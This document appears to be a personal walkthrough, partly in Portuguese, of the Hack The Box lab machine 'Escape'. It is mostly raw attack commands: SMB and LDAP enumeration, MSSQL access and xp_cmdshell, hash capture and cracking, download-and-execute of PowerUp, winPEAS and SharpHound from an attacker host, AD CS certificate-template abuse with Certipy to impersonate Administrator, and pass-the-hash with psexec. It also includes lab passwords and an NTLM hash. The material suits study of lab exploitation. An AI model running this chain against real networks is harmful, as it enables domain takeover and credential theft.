Escape
========================


## Enumeration


    sudo nmap_enum 10.10.11.202

![qownnotes-media-CdhtfS](../../../media/qownnotes-media-CdhtfS.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn escape.htb | tee nmap_udp_output.txt

![qownnotes-media-ElOypL](../../../media/qownnotes-media-ElOypL.png)

    sudo nmap -p- -Pn -T5 -n escape.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-WsqFaG](../../../media/qownnotes-media-WsqFaG.png)

    rpcclient -U '' -N 10.10.11.202
    srvinfo
    enumdomusers
![qownnotes-media-JePJEp](../../../media/qownnotes-media-JePJEp.png)

    smbclient -L //escape.htb

![qownnotes-media-aCpQkO](../../../media/qownnotes-media-aCpQkO.png)

    smbclient //10.10.11.202/Public

![qownnotes-media-KemWIP](../../../media/qownnotes-media-KemWIP.png)

    open SQL\ Server\ Procedures.pdf

![qownnotes-media-FBmKKL](../../../media/qownnotes-media-FBmKKL.png)

DNS enumeration

    dig axfr escape.htb @10.10.11.202

![qownnotes-media-rLJaAw](../../../media/qownnotes-media-rLJaAw.png)


## Exploitation

    impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@escape.htb'

![qownnotes-media-lMlzkc](../../../media/qownnotes-media-lMlzkc.png)

    #MSSQL enumeration
    select user_name();
    SELECT name FROM master.dbo.sysdatabases;
    SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
![qownnotes-media-GbaVJD](../../../media/qownnotes-media-GbaVJD.png)

![qownnotes-media-xienmM](../../../media/qownnotes-media-xienmM.png)

    CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
    
![qownnotes-media-xbqbGe](../../../media/qownnotes-media-xbqbGe.png)

    select name, create_date, modify_date, type_desc as type, authentication_type_desc as authentication_type, sid from sys.database_principals where type not in ('A', 'R') order by name;
    sp_configure 'show advanced options', '1'
    EXEC master..xp_cmdshell 'whoami'
    EXEC sp_helprotect 'xp_dirtree';
![qownnotes-media-ktBPkP](../../../media/qownnotes-media-ktBPkP.png)

    impacket-smbserver -smb2support smb .

![qownnotes-media-aGTxBk](../../../media/qownnotes-media-aGTxBk.png)

![qownnotes-media-CerESf](../../../media/qownnotes-media-CerESf.png)

    cat hash.txt
    john -w=/usr/share/wordlists/rockyou.txt hash.txt

![qownnotes-media-nxpTHl](../../../media/qownnotes-media-nxpTHl.png)

    evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie

![qownnotes-media-xquJjK](../../../media/qownnotes-media-xquJjK.png)


## Privilege Escalation

    whoami /all
    systeminfo
    iex (new-object net.webclient).downloadstring('http://10.10.14.17/4-privilege%20escalation/PowerUp.ps1'); invoke-allchecks
 
 ![qownnotes-media-LTllWT](../../../media/qownnotes-media-LTllWT.png)

    wget http://10.10.14.17/4-privilege%20escalation/winPEASx64.exe -o w.exe
    ./w.exe
    
    wget http://10.10.14.17/6-AD_Tools/SharpHound.exe -o SH.exe
    ./SH.exe
    download 20231121214139_BloodHound.zip

![qownnotes-media-pUeaCM](../../../media/qownnotes-media-pUeaCM.png)

    cmdkey /list

    gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 
 ![qownnotes-media-VEoqdT](../../../media/qownnotes-media-VEoqdT.png)

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    
    findstr /si password *.doc *.txt *.ini *.config]

    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
    
    schtasks /query /fo LIST /v

![qownnotes-media-vEYXEp](../../../media/qownnotes-media-vEYXEp.png)

    wmic qfe
    
    wmic logicaldisk get caption
    
    tasklist /svc > tl.txt
    
    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

![qownnotes-media-nXboRo](../../../media/qownnotes-media-nXboRo.png)

    reg query HKLM /f *password* /t REG_SZ /s
    
    cd c:/users
    gci -recurse

![qownnotes-media-wPJWMW](../../../media/qownnotes-media-wPJWMW.png)

Aqui eu voltei para o banco para saber se dava para escalar por meio do próprio banco:

    SELECT * FROM sys.fn_builtin_permissions(DEFAULT);

    SELECT IS_SRVROLEMEMBER('sysadmin');

    EXEC sp_helprotect 'xp_cmdshell';
    
    SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
    
    EXEC sp_helprotect 'xp_fileexist';
    
    SELECT suser_sname(owner_sid) FROM sys.databases
    
    EXECUTE AS LOGIN = 'sa'
    
    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
    
    SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';

Depois eu prossegui com outra estratégia que foi possível obter a escalação de privilégio por meio de ADCS (AD CS):

    /home/acosta/owncloud/Area_de_trabalho/tools/linux/6-Others/Certipy/venv/bin/certipy find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -stdout -vulnerable

![qownnotes-media-VriyfY](../../../media/qownnotes-media-VriyfY.png)

    /home/acosta/owncloud/Area_de_trabalho/tools/linux/6-Others/Certipy/venv/bin/certipy req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca sequel-DC-CA -template UserAuthentication -upn 'Administrator@sequel.htb'

    /home/acosta/owncloud/Area_de_trabalho/tools/linux/6-Others/Certipy/venv/bin/certipy auth -pfx administrator.pfx

![qownnotes-media-vtxqjr](../../../media/qownnotes-media-vtxqjr.png)

    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee Administrator@sequel.htb
    
![qownnotes-media-dOKLrE](../../../media/qownnotes-media-dOKLrE.png)

Tem outras formas de fazer o ADCS também com acesso local na máquina que seria com o certify:

<https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin?source=post_page-----931dba100509-------------------------------->

<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation?source=post_page-----931dba100509-------------------------------->

Uma outra opção ainda seria com o crackmapexec:

    crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M adcs 